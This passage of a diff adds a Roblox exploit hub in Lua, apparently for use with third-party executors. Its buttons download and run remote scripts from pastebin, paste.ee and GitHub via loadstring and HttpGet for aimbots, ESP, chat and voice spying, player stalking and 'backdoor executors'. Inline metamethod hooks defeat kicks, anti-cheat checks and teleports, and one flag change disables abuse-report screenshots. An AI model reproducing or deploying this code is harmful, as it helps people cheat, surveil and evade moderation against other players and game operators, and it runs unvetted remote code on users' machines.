+      if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
+        speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
+        wait(.1)
+      end
+      teleport(speaker,PlayerTarget,PlayerTargettwo)
+    end
+    end    
+})
+
+Player:AddButton({
+  Name = "Fast Teleport Player to Player",
+  Callback = function()
+        if getRoot(PlayerTarget.Character) and getRoot(PlayerTargettwo.Character) then
+      if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
+        speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
+        wait(.1)
+      end
+      teleport(speaker,PlayerTarget,PlayerTargettwo, true)
+    end
+    end    
+})
+local Tab = Window:MakeTab({
+  Name = "Universal Scripts",
+  Icon = "rbxassetid://6031763428",
+  PremiumOnly = false
+})
+local Section = Tab:AddSection({
+  Name = "Scripts"
+})
+Tab:AddButton({
+  Name = "Fly",
+  Callback = function()
+        loadstring(game:HttpGet('https://pastebin.com/raw/YSL3xKYU'))()
+    end   
+})
+Tab:AddButton({
+  Name = "Keyboard",
+  Callback = function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
+    end  
+})
+Tab:AddButton({
+  Name = "Script Reacher",
+  Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Sluucker/badware/main/loader", true))()
+    end   
+})
+Tab:AddButton({
+  Name = "Esp",
+  Callback = function()
+      loadstring(game:HttpGet('https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP'))()	
+    end   
+})
+Tab:AddButton({
+  Name = "Fling Gui",
+  Callback = function()
+ loadstring(game:HttpGet("https://rawscripts.net/raw/test-whatman-yeet-7508"))()     	
+    end   
+})
+Tab:AddButton({
+  Name = "Silent Aim",
+  Callback = function()
+      loadstring(game:HttpGet("https://paste.ee/r/QMOEj", true))()	
+    end   
+})
+Tab:AddButton({
+  Name = "Chat Spy",
+  Callback = function()
+      loadstring(game:HttpGet("https://pastebin.com/raw/uDJxbbkJ"))()	
+    end   
+})
+
+Tab:AddButton({
+  Name = "Chat Logs",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/8vS5Dqdr"))()
+    end   
+})
+Tab:AddButton({
+  Name = "Chat Bypasser",
+  Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/vqmpjay/Vastral/main/Vastral.lua"))()	
+    end   
+})
+Tab:AddButton({
+  Name = "Free Animations",
+  Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Animation-Hub/main/Animation%20Gui", true))()	
+    end   
+})
+Tab:AddButton({
+  Name = "Shiftlock",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/zBbLeZmD"))()
+    end   
+})
+Tab:AddButton({
+  Name = "Server Finder GUI",
+  Callback = function()
+      loadstring(game:HttpGet("https://paste.ee/r/w3kXN", true))()
+    end    
+})
+
+Tab:AddButton({
+  Name = "Stream Sniper GUI",
+  Callback = function()
+      loadstring(game:HttpGet("https://paste.ee/r/SDqxo", true))()
+    end    
+})
+
+Tab:AddButton({
+  Name = "Team Changer GUI",
+  Callback = function()
+      loadstring(game:HttpGet("https://paste.ee/r/uQAAd", true))()
+    end    
+})
+
+Tab:AddButton({
+  Name = "VoiceChat Spy GUI",
+  Callback = function()
+        getgenv().VoicechatSpySettings = {
+    TrackVoice3d = false,
+    FollowDistance = 0
+}
+
+      loadstring(game:HttpGet("https://paste.ee/r/4HQro", true))()
+    end    
+})
+
+Tab:AddButton({
+  Name = "Player Stalker GUI",
+  Callback = function()
+      loadstring(game:HttpGet("https://paste.ee/r/vfmOp", true))()
+    end    
+})
+Tab:AddButton({
+  Name = "Chat Translator [Request]",
+  Callback = function()
+      game.StarterGui:SetCore("SendNotification", {Title = "Warning!", Text = "If this doesn't work for you, then: 1) It's not for synapse x (maybe) and that uses request, which synapse x can't use it (not sure) but others for example krnl, electron, they can support this. Try with syn.request not request.", Duration = 15,})
+      loadstring(game:HttpGet("https://paste.ee/r/Rranu", true))()
+    end    
+})
+
+Tab:AddButton({
+  Name = "Chat Translator [Syn.Request]",
+  Callback = function()
+      game.StarterGui:SetCore("SendNotification", {Title = "Warning!", Text = "If this doesn't work for you, then: 1) It's for synapse x and that uses syn.request, which nobody can use it expect synapse x. Try with request not syn.request.", Duration = 10,})
+      loadstring(game:HttpGet("https://paste.ee/r/RjC9O", true))()
+    end    
+})
+Tab:AddButton({
+	Name = "",
+	Callback = function()
+      mouse = game.Players.LocalPlayer:GetMouse()
+   tool = Instance.new("Tool")
+   tool.RequiresHandle = false
+   tool.Name = "Equip to Click TP"
+   tool.Activated:connect(function()
+      local pos = mouse.Hit+Vector3.new(0,2.5,0)
+      pos = CFrame.new(pos.X,pos.Y,pos.Z)
+      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
+        end)
+  	end
+})
+Tab:AddButton({
+  Name = "Telekinesis Tool",
+  Callback = function()
+      loadstring(game:HttpGet("https://pastebin.com/raw/vVze4jgA",true))()	
+    end   
+})
+Tab:AddButton({
+  Name = "F3X (BTOOL)",
+  Callback = function()
+      loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()	
+    end   
+})
+Tab:AddButton({
+  Name = "Admin Tools",
+  Callback = function()
+      loadstring(game:HttpGet(('https://pastefy.app/VYIAk3o1/raw'),true))()	
+    end   
+})
+Tab:AddButton({
+  Name = "Wall Walking",
+  Callback = function()
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/mewishmew9/scripti/main/WallWalker.txt'),true))()  	
+    end   
+})
+Tab:AddButton({
+  Name = "Rtx 1",
+  Callback = function()
+     loadstring(game:HttpGet('https://pastebin.com/raw/Bkf0BJb3'))() 	
+    end   
+})
+Tab:AddButton({
+  Name = "Rtx 2",
+  Callback = function()
+   loadstring(game:HttpGet('https://raw.githubusercontent.com/PixelatedColors/Hydrox4Roblox/main/UniversalRtx'))()
+    end
+})
+local Section = Tab:AddSection({
+  Name = "Remote Spies"
+})
+Tab:AddButton({
+  Name = "RemoteSpy",
+  Callback = function()
+        loadstring(game:HttpGet("https://paste.ee/r/9N1Fc", true))()
+    end    
+})
+Tab:AddButton({
+  Name = "DarkSpy",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/SwZq0zCf"))()
+    end
+})
+
+Tab:AddButton({
+  Name = "FilterShark",
+  Callback = function()
+        loadstring(game:HttpGet("https://paste.ee/r/Fffa4"))()
+    end    
+})
+
+Tab:AddButton({
+  Name = "FrostHook",
+  Callback = function()
+        loadstring(game:HttpGet("https://paste.ee/r/z29rx"))()
+    end    
+})
+
+Tab:AddButton({
+  Name = "EngoSpy",
+  Callback = function()
+        local settings = {
+   saveCalls = false,
+   maxCallsSaved = 1000,
+   saveOnlyLastCall = true,
+   maxTableDepth = 100,
+   minimizeBind = Enum.KeyCode.RightAlt,
+   blacklistedNames = {}
+}
+loadstring(game:HttpGet("https://paste.ee/r/jsyu2"))(settings)
+    end    
+})
+
+Tab:AddButton({
+  Name = "Hydroxide",
+  Callback = function()
+        local owner = "Upbolt"
+local branch = "revision"
+
+local function webImport(file)
+    return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format(owner, branch, file)), file .. '.lua')()
+end
+
+webImport("init")
+webImport("ui/main")
+    end    
+})
+
+Tab:AddButton({
+  Name = "MrSpy",
+  Callback = function()
+        loadstring(game:HttpGet("https://paste.ee/r/z06zN"))()
+    end    
+})
+
+Tab:AddButton({
+  Name = "SimpleSpy",
+  Callback = function()
+        loadstring(game:HttpGet("https://paste.ee/r/nfHwB"))()
+    end    
+})
+
+Tab:AddButton({
+  Name = "Remote Grabber",
+  Callback = function()
+        loadstring(game:HttpGet("https://paste.ee/r/Dddcj"))()
+    end    
+})
+local Section = Tab:AddSection({
+  Name = "Executors"
+})
+Tab:AddButton({
+  Name = "RC7",
+  Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/CoreGui/Scripts/main/RC7"))()
+    end   
+})
+Tab:AddButton({
+  Name = "Synapse X",
+  Callback = function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/QvnEA2cA"))()  	
+    end   
+})
+Tab:AddButton({
+  Name = "Backdoor executor",
+  Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()	
+    end   
+})
+Tab:AddButton({
+  Name = "Arceus X",
+  Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))()	
+    end   
+})
+Tab:AddButton({
+  Name = "Executor 1",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/WmwNN8UG"))()
+    end   
+})
+Tab:AddButton({
+  Name = "Executor 2",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/4Aqjp3mE"))()
+    end   
+})
+Tab:AddButton({
+  Name = "Executor 3",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/CUxAx1Uk"))()
+    end   
+})
+Tab:AddButton({
+  Name = "Executor 4",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/CtUkUr93"))()
+    end   
+})
+local Section = Tab:AddSection({
+  Name = "Bypass"
+})
+
+Tab:AddButton({
+  Name = "Anti-Lag",
+  Callback = function()
+_G.Settings = {
+    Players = {
+        ["Ignore Me"] = true, 
+        ["Ignore Others"] = true
+    },
+    Meshes = {
+        Destroy = false, 
+        LowDetail = true 
+    },
+    Images = {
+        Invisible = true, 
+        LowDetail = true, 
+        Destroy = false, 
+    },
+    Other = {
+        ["No Particles"] = true, -- Disables all ParticleEmitter, Trail, Smoke, Fire and Sparkles
+        ["No Camera Effects"] = true, -- Disables all PostEffect's (Camera/Lighting Effects)
+        ["No Explosions"] = true, -- Makes Explosion's invisible
+        ["No Clothes"] = true, -- Removes Clothing from the game
+        ["Low Water Graphics"] = true, -- Removes Water Quality
+        ["No Shadows"] = true, -- Remove Shadows
+        ["Low Rendering"] = true, -- Lower Rendering
+        ["Low Quality Parts"] = true -- Lower quality parts
+    }
+}
+loadstring(game:HttpGet("https://paste.ee/r/WXhdX"))()
+print("Anti-Lag loaded")
+    end    
+})
+
+Tab:AddButton({
+  Name = "Anti-Afk SendKeyEventMethod",
+  Callback = function()
+        local VirtualInputManager = game:GetService("VirtualInputManager")
+local UserInputService = game:GetService("UserInputService")
+local Hooks = {}
+
+local function SortArguments(self, ...)
+    return self, {...}
+end
+
+local Old; Old = hookmetamethod(UserInputService.WindowFocused, "__index", function(...)
+    local self, Index = ...
+    local Response = Old(self, Index)
+
+    if (tostring(self):find("WindowFocused") or tostring(self):find("WindowFocusReleased")) and not table.find(Hooks, Response) then
+        table.insert(Hooks, Response)
+
+        if Index:lower() == "wait" then
+            local Old2; Old2 = hookfunction(Response, function(...)
+                local self1 = ...
+
+                if self1 == self then
+                    self1 = Instance.new("BindableEvent").Event
+                end
+
+                return Old2(self1)
+            end)
+        elseif Index:lower() == "connect" then
+            local Old2; Old2 = hookfunction(Response, function(...)
+                local self1, Function = ...
+
+                if self1 == self then
+                    Function = function() return; end
+                end
+
+                return Old2(self1, Function)
+            end)
+        end
+    end
+
+    return Response
+end)
+
+for i, v in next, getconnections(UserInputService.WindowFocusReleased) do
+    v:Disable()
+end
+
+for i, v in next, getconnections(UserInputService.WindowFocused) do
+    v:Disable()
+end
+
+if not getgenv().WindowFocused then
+    firesignal(UserInputService.WindowFocused)
+    getgenv().WindowFocused = true
+end
+
+while true do
+    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Unknown, false, game)
+
+    task.wait(Random.new():NextNumber(15, 120))
+end
+
+print("Anti-Afk SendKeyEventMethod Loaded")
+    end    
+})
+
+Tab:AddButton({
+  Name = "Anti-Afk ClickButtonMethod",
+  Callback = function()
+        local VirtualUser=game:service'VirtualUser'
+game:service'Players'.LocalPlayer.Idled:connect(function()
+VirtualUser:CaptureController()
+VirtualUser:ClickButton2(Vector2.new())
+end)
+
+print("Anti-Afk ClickButtonMethod Loaded")
+    end    
+})
+
+Tab:AddButton({
+  Name = "Anti-Afk KeyboardButtonMethod",
+  Callback = function()
+        local vu = game:GetService("VirtualUser")
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+   wait(1)
+   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+end)
+print("Anti-Afk KeyboardButtonMethod Loaded")
+    end    
+})
+
+Tab:AddButton({
+  Name = "Anti-Cheat",
+  Callback = function()
+        local mt = getrawmetatable(game)
+local ncallsa = mt.__namecall
+  setreadonly(mt, false)
+  mt.__namecall = newcclosure(function(...)
+    local args = {...}
+    if not checkcaller() and getnamecallmethod() == "Cheat" then
+      return nil
+    end
+    return ncallsa(...)
+  end)
+  setreadonly(mt, true)
+
+print("Anti-Cheat Loaded")
+    end    
+})
+
+Tab:AddButton({
+  Name = "Anti-Kick",
+  Callback = function()
+        local mt = getrawmetatable(game)
+local ncallsa = mt.__namecall
+  setreadonly(mt, false)
+  mt.__namecall = newcclosure(function(...)
+    local args = {...}
+    if not checkcaller() and getnamecallmethod() == "Kick" then
+      return nil
+    end
+    return ncallsa(...)
+  end)
+  setreadonly(mt, true)
+
+print("Anti-Kick Loaded")
+    end    
+})
+
+Tab:AddButton({
+  Name = "Anti-Kick NewcclosureMethod",
+  Callback = function()
+        local mt = getrawmetatable(game)
+  local old = mt.__namecall
+  local protect = newcclosure or protect_function
+
+        setreadonly(mt, false)
+  mt.__namecall = protect(function(self, ...)
+    local method = getnamecallmethod()
+    if method == "Kick" then
+      wait(9e9)
+      return
+    end
+    return old(self, ...)
+  end)
+  hookfunction(game.Players.LocalPlayer.Kick,protect(function() wait(9e9) end))
+print("Anti-Kick NewcclosureMethod loaded")
+    end    
+})
+
+Tab:AddButton({
+  Name = "Anti-Kick HookFunctionMethod",
+  Callback = function()
+        --// Variables
+
+local Players = game:GetService("Players")
+local OldNameCall = nil
+
+--// Global Variables
+
+getgenv().SendNotifications = true -- Set to true if you want to get notified regularly.
+
+--// Anti Kick Hook
+
+OldNameCall = hookmetamethod(game, "__namecall", function(Self, ...)
+    local NameCallMethod = getnamecallmethod()
+
+    if tostring(string.lower(NameCallMethod)) == "kick" then
+
+        return nil
+    end
+
+    return OldNameCall(Self, ...)
+end)
+
+if getgenv().SendNotifications == true then
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "Anti-Kick",
+        Text = "Anti-Kick HookFunctionMethod script loaded",
+        Icon = "rbxassetid://6238537240",
+        Duration = 5,
+    })
+end
+    end    
+})
+
+Tab:AddButton({
+  Name = "Remote Anti-Kick",
+  Callback = function()
+        local mt = getrawmetatable(game) --get meta
+
+local oldnamecall = mt.__namecall --store namecall
+
+setreadonly(mt, false) --make mt writeable
+
+mt.__namecall = newcclosure(function(self, ...) --newcclosure yes
+   local method = getnamecallmethod() --namecall
+   local Args = {...} --args variable
+   if not checkcaller() and method == "FireServer" and Args[1] == "Kick" then --This is where you put the Args, for example if the event were game.ReplicatedStorage.Anti:FireServer("Kick", "bad") you would do Args[1]. For bad you would do Args[2]
+       return nil --most devs crash you so just do this, you can do this without wait.
+   end
+
+   return oldnamecall(self, ...) --return old
+end)
+
+setreadonly(mt, true)
+print("Remote Anti-Kick loaded")
+    end    
+})
+
+Tab:AddButton({
+  Name = "Remote Anti-Kick WaitMethod",
+  Callback = function()
+        local mt = getrawmetatable(game) --get meta
+
+local oldnamecall = mt.__namecall --store namecall
+
+setreadonly(mt, false) --make mt writeable
+
+mt.__namecall = newcclosure(function(self, ...) --newcclosure yes
+   local method = getnamecallmethod() --namecall
+   local Args = {...} --args variable
+   if not checkcaller() and method == "FireServer" and Args[1] == "Kick" then --This is where you put the Args, for example if the event were game.ReplicatedStorage.Anti:FireServer("Kick", "bad") you would do Args[1]. For bad you would do Args[2]
+       return wait(math.huge) --most devs crash you so just do this, you can do this without wait.
+   end
+
+   return oldnamecall(self, ...) --return old
+end)
+
+setreadonly(mt, true)
+print("Remote Anti-Kick WaitMethod loaded")
+    end    
+})
+
+Tab:AddButton({
+  Name = "Anti-TeleportService",
+  Callback = function()
+        local TeleportService, tp, tptpi = game:GetService("TeleportService")
+  tp = hookfunction(TeleportService.Teleport, function(id, ...)
+    if allow_rj and id == game.Placeid then
+      return tp(id, ...)
+    end
+    return wait(9e9)
+  end)
+  tptpi = hookfunction(TeleportService.TeleportToPlaceInstance, function(id, server, ...)
+    if allow_rj and id == game.Placeid and server == game.JobId then
+      return tp(id, server, ...)
+    end
+    return wait(9e9)
+  end)
+print("Anti-TeleportService loaded")
+    end    
+})
+
+Tab:AddButton({
+  Name = "Position/CFrame Anti-Teleport",
+  Callback = function()
+        local mt = getrawmetatable(game)
+setreadonly(mt, false)
+local old = mt.__index
+
+local player = game.Players.LocalPlayer
+local IsLoop = false  
+local CFrame = player.Character.HumanoidRootPart.CFrame
+
+mt.__index = newcclosure(function(self, key)
+    if self == "HumanoidRootPart" or self == "Torso" and self.Parent == player.Character and key == "CFrame" or key == "Position" and IsLoop then
+        return CFrame
+    end
+    return old(self, key)
+end)
+print("Position/CFrame Anti-Teleport loaded")
+    end    
+})
+
+Tab:AddButton({
+  Name = "Anti-Reach",
+  Callback = function()
+        for i,h in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+        if h:IsA("BasePart") then
+               for i,v in pairs(getconnections(h:GetPropertyChangedSignal"Size")) do
+                  v:Disable()
+end
+end
+end
+print("Anti-Reach loaded.")
+print("Anti-Reach NOTE: If it's not work for you when you spawned as a new character, then use it again. There's no loop.")
+    end    
+})
+Tab:AddButton({
+  Name = "Anti-Fling",
+  Callback = function()
+        local Services = setmetatable({}, {__index = function(Self, Index)
+      local NewService = game.GetService(game, Index)
+      if NewService then
+        Self[Index] = NewService
+      end
+      return NewService
+    end})
+
+    -- [ LocalPlayer ] --
+    local LocalPlayer = Services.Players.LocalPlayer
+
+    -- // Functions \\ --
+    local function PlayerAdded(Player)
+      local Detected = false
+      local Character;
+      local PrimaryPart;
+
+      local function CharacterAdded(NewCharacter)
+        Character = NewCharacter
+        repeat
+          wait()
+          PrimaryPart = NewCharacter:FindFirstChild("HumanoidRootPart")
+        until PrimaryPart
+        Detected = false
+      end
+
+      CharacterAdded(Player.Character or Player.CharacterAdded:Wait())
+      Player.CharacterAdded:Connect(CharacterAdded)
+      Services.RunService.Heartbeat:Connect(function()
+        if (Character and Character:IsDescendantOf(workspace)) and (PrimaryPart and PrimaryPart:IsDescendantOf(Character)) then
+          if PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 or PrimaryPart.AssemblyLinearVelocity.Magnitude > 100 then
+            if Detected == false then
+              game.StarterGui:SetCore("ChatMakeSystemMessage", {
+                Text = "Fling Exploit detected, Player: " .. tostring(Player);
+                Color = Color3.fromRGB(255, 200, 0);
+              })
+            end
+            Detected = true
+            for i,v in ipairs(Character:GetDescendants()) do
+              if v:IsA("BasePart") then
+                v.CanCollide = false
+                v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+                v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
+              end
+            end
+            PrimaryPart.CanCollide = false
+            PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+            PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+            PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
+          end
+        end
+      end)
+    end
+
+    -- // Event Listeners \\ --
+    for i,v in ipairs(Services.Players:GetPlayers()) do
+      if v ~= LocalPlayer then
+        PlayerAdded(v)
+      end
+    end
+    Services.Players.PlayerAdded:Connect(PlayerAdded)
+
+    local LastPosition = nil
+    Services.RunService.Heartbeat:Connect(function()
+      pcall(function()
+        local PrimaryPart = LocalPlayer.Character.PrimaryPart
+        if PrimaryPart.AssemblyLinearVelocity.Magnitude > 250 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 250 then
+          PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+          PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+          PrimaryPart.CFrame = LastPosition
+
+          game.StarterGui:SetCore("ChatMakeSystemMessage", {
+            Text = "You were flung. Neutralizing velocity.";
+            Color = Color3.fromRGB(255, 0, 0);
+          })
+        elseif PrimaryPart.AssemblyLinearVelocity.Magnitude < 50 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 then
+          LastPosition = PrimaryPart.CFrame
+        end
+      end)
+    end)
+print("Anti-Fling loaded")
+    end    
+})
+Tab:AddButton({
+  Name = "Anti-Network Library",
+  Callback = function()
+        repeat task.wait() until game:IsLoaded()
+local Players = game:GetService("Players") --define variables n shit
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+--[[
+Network Library by 4eyes
+Usage: Put this in your script and use Network.RetainPart(Part) on any part you'd like to retain ownership over, then just apply a replicating method of movement. Credit me if you'd like.
+loadstring(game:HttpGet("https://raw.githubusercontent.com/your4eyes/RobloxScripts/main/Net_Library.lua"))()
+--]]
+if not getgenv().Network then
+    getgenv().Network = {}
+    Network["BaseParts"] = {}
+    Network["RetainPart"] = function(Part) --function for retaining ownership of unanchored parts
+        if Part:IsA("BasePart") and not isnetworkowner(Part) then
+            local CParts = Part:GetConnectedParts()
+            for _,CPart in pairs(CParts) do --check if part is connected to anything already in baseparts being retained
+                if table.find(Network["BaseParts"],CPart) then
+                    print("Did not apply PartOwnership to part, as it is already connected to a part with this method active.")
+                    return
+                end
+            end
+            local BV = Instance.new("BodyVelocity") --create bodyvelocity to apply constant physics packets and retain ownership
+            BV.Name = "NetworkRetainer"
+        BV.MaxForce = Vector3.new(1/0,1/0,1/0)
+            BV.P = 1/0
+            BV.Velocity = Vector3.new(30,30,30)
+            BV.Parent = Part
+            table.insert(Network["BaseParts"],Part)
+        end
+    end
+    Network["SuperStepper"] = Instance.new("BindableEvent") --make super fast event to connect to
+    setfflag("NewRunServiceSignals","true")
+    for _,Event in pairs({RunService.RenderStepped,RunService.Heartbeat,RunService.Stepped,RunService.PreSimulation,RunService.PostSimulation}) do
+        Event:Connect(function()
+            return Network["SuperStepper"]:Fire(Network["SuperStepper"],tick())
+        end)
+    end
+    Network["PartOwnership"] = {}
+    Network["PartOwnership"]["Enabled"] = false
+    Network["PartOwnership"]["Execute"] = coroutine.create(function() --creating a thread for network stuff
+        if Network["PartOwnership"]["Enabled"] == false then
+            Network["PartOwnership"]["Enabled"] = true --do cool network stuff before doing more cool network stuff
+            setscriptable(workspace,"PhysicsSteppingMethod",true)
+            setscriptable(workspace,"PhysicsSimulationRateReplicator",true)
+            settings().Physics.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Disabled
+            workspace.PhysicsSimulationRateReplicator = Enum.PhysicsSimulationRate.Fixed240Hz
+            workspace.InterpolationThrottling = Enum.InterpolationThrottling.Enabled
+            workspace.PhysicsSteppingMethod = Enum.PhysicsSteppingMethod.Fixed
+            LocalPlayer.ReplicationFocus = workspace
+            settings().Physics.AllowSleep = false
+            Network["SuperStepper"].Event:Connect(function() --super fast asynchronous loop
+                sethiddenproperty(LocalPlayer,"SimulationRadius",1/0)
+                for _,Part in pairs(Network["BaseParts"]) do --loop through parts and do network stuff
+                    coroutine.wrap(function()
+                        if not isnetworkowner(Part) then --lag parts my ownership is contesting but dont have network over to spite the people who have ownership of stuff i want >:(
+                            print("[NETWORK] Part "..Part:GetFullName().." is not owned. Contesting ownership...")
+                            sethiddenproperty(Part,"NetworkIsSleeping",true)
+                        else
+                            sethiddenproperty(Part,"NetworkIsSleeping",false)
+                        end
+                        --[==[ [[by 4eyes btw]] ]==]--
+                    end)()
+                end
+            end)
+        end
+    end)
+    coroutine.resume(Network["PartOwnership"]["Execute"])
+end
+    end    
+})
+
+Tab:AddButton({
+  Name = "Anti-Net",
+  Callback = function()
+        for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
+if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
+game:GetService("RunService").Heartbeat:connect(function()
+v.Velocity = Vector3.new(45,0,0)
+end)
+end
+end
+print("Anti-Net loaded")
+    end    
+})
+
+Tab:AddButton({
+  Name = "Anti-Netless",
+  Callback = function()
+        loadstring(game:HttpGet("https://paste.ee/r/E8tES"))()
+        print("Anti-Netless loaded")
+    end    
+})
+Tab:AddButton({
+  Name = "Anti-Report",
+  Callback = function()
+        setfflag("AbuseReportScreenshotPercentage", 0)
+setfflag("DFFlagAbuseReportScreenshot", "False")
+print("Anti-Report loaded")
+    end    
+})
+
+Tab:AddButton({
+  Name = "Anti-DisplayName",
+  Callback = function()
+      local AntiDisplayName = loadstring(game:HttpGet('https://paste.ee/r/j7ZgJ'))(function()
+    getgenv().Preferences = {}
+end)
+
+Preferences = {
+    RetroNaming = false,
+    ShowOriginalName = true,
+    ApplyToLeaderboard = true,
+    IdentifyFriends = {Toggle = true, Identifier = '[Friend]'},
+    IdentifyBlocked = {Toggle = true, Identifier = '[Blocked]'},
+    IdentifyPremium = {Toggle = true, Identifier = '[Premium]'},
+    IdentifyDeveloper = {Toggle = true, Identifier = '[Game Dev]'},
+    SpoofLocalPlayer = {Toggle = false, UseRandomName = true, NewName = 'Random Name Lol'},
+    Orientation = 'Horizontal'
+}
+print("Anti-DisplayName loaded")
+    end    
+})
+
+Tab:AddButton({
+  Name = "Anti-Hat",
+  Callback = function()
+        local client = game:GetService("Players").LocalPlayer
+local char = client.Character
+local antihat = true
+
+for _,delete in pairs(char:GetChildren()) do
+    if delete:IsA('Accessory') then
+        delete.Handle:Destroy()
+    end
+end
+
+client.CharacterAdded:Connect(function()
+repeat wait()
+    for i,v in pairs(char:GetChildren()) do
+        if v:IsA("Accessory") then
+           wait(1)
+           v.Handle:Destroy()
+        end
+    end
+until antihat == false
+end)
+print("Anti-Hat loaded")
+    end    
+})
+
+Tab:AddButton({
+  Name = "Anti-Body Movers",
+  Callback = function()
+local client = game:GetService("Players").LocalPlayer
+local char = client.Character
+local antibody = true
+
+for _,v in pairs(char:GetDescendants()) do
+    if v:IsA("BodyAngularVelocity") or v:IsA("BodyForce") or v:IsA("BodyGyro") or v:IsA("BodyThrust") or v:IsA("BodyVelocity") or v:IsA("BodyPosition") or v:IsA("RocketPropulsion") then
+        v:Destroy()
+    end
+end
+
+repeat wait()
+        for _,v in pairs(char:GetDescendants()) do
+    if v:IsA("BodyAngularVelocity") or v:IsA("BodyForce") or v:IsA("BodyGyro") or v:IsA("BodyThrust") or v:IsA("BodyVelocity") or v:IsA("BodyPosition") or v:IsA("RocketPropulsion") then
+        v:Destroy()
+    end
+end
+until antibody == false
+
+print("Anti-Body Movers loaded")
+    end    
+})
+
+Tab:AddButton({
+  Name = "Anti-WalkSpeed",
+  Callback = function()
+        local gmt = getrawmetatable(game)
+
+        local oldindex = gmt._index
+
+setreadonly(gmt, false)
+
+gmt._index = newcclosure(function(self,k)
+    if self == "Humanoid" and k == "WalkSpeed" then
+        return 16
+    end
+    return oldindex(self,k)
+end)
+setreadonly(gmt, true)
+print("Anti-WalkSpeed loaded")
+    end    
+})
+Tab:AddButton({
+  Name = "Anti-JumpPower",
+  Callback = function()
+        local gmt = getrawmetatable(game)
+
+        local oldindex = gmt._index
+
+setreadonly(gmt, false)
+
+gmt._index = newcclosure(function(self,k)
+    if self == "Humanoid" and k == "JumpPower" then
+        return 50
+    end
+    return oldindex(self,k)
+end)
+setreadonly(gmt, true)
+print("Anti-JumpPower loaded")
+    end    
+})
+
+Tab:AddButton({
+  Name = "Anti-HipHeight",
+  Callback = function()
+        local gmt = getrawmetatable(game)
+
+        local oldindex = gmt._index
+
+setreadonly(gmt, false)
+
+gmt._index = newcclosure(function(self,k)
+    if self == "Humanoid" and k == "HipHeight" then
+        return 0
+    end
+    return oldindex(self,k)
+end)
+setreadonly(gmt, true)
+print("Anti-Height loaded")
+    end    
+})
+
+Tab:AddTextbox({
+  Name = "Anti-WaitCooldown",
+  Default = "",
+  TextDisappear = true,
+  Callback = function(JPNumber)
+    local OldH; OldH = hookfunction(wait, function(w)
+
+local NumberDelay = tonumber(JPNumber)
+
+if w == NumberDelay then
+   return 0
+end
+
+return OldH(w)
+
+end)
+print("Anti-WaitCooldown loaded")
+  end	  
+})
+
+local Section = Tab:AddSection({
+  Name = "Esp"
+})
+
+local ESPz = loadstring(game:HttpGet("https://paste.ee/r/aFx08", true))()
+
+Tab:AddToggle({
+  Name = "ESP",
+  Default = false,
+  Callback = function(ESPD)
+        ESPz:Toggle(ESPD)
+  end    
+})
+
+Tab:AddToggle({
+  Name = "Show Box",
+  Default = false,
+  Callback = function(ESPb)
+      ESPz.Boxes = ESPb
+  end    
+})
+
+Tab:AddToggle({
+  Name = "Show Players",
+  Default = false,
+  Callback = function(ESPp)
+        ESPz.Players = ESPp
+  end    
+})
+
+Tab:AddToggle({
+  Name = "Show Names",
+  Default = false,
+  Callback = function(ESPn)
+        ESPz.Names = ESPn
+  end    
+})
+
+Tab:AddToggle({
+  Name = "Show TeamColor",
+  Default = false,
+  Callback = function(ESPtc)
+        ESPz.TeamColor = ESPtc
+  end    
+})
+
+Tab:AddLabel("Chams")
+
+local chamsadded
+local chamsremoved
+local chamshah = {}
+
+Tab:AddToggle({
+  Name = "Chams",
+  Default = false,
+  Callback = function(Chams)
+    if Chams == true then
